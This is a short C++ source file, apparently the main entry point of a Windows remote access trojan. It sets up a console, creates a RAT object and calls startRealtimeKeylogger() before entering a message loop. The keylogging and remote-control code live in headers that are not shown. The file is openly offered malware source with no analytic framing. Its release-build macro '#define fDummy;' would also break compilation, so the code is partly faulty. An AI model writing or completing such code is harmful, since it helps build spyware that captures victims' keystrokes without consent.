#include "rat/rat.h"
#include "helper/debug.h"

#ifdef _DEBUG
FILE* fDummy;
#else
#define fDummy;
#endif

void SetupDebugConsole() {
	AllocConsole();
	freopen_s(&fDummy, "CONIN$", "r", stdin);
	freopen_s(&fDummy, "CONOUT$", "w", stderr);
	freopen_s(&fDummy, "CONOUT$", "w", stdout);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	SetupDebugConsole();
	
	RAT rat;
    rat.startRealtimeKeylogger();

	MSG msg;
	BOOL bRet;
	while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
		if (bRet == -1) {
			// handle error
		}
		else {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return 0;
}

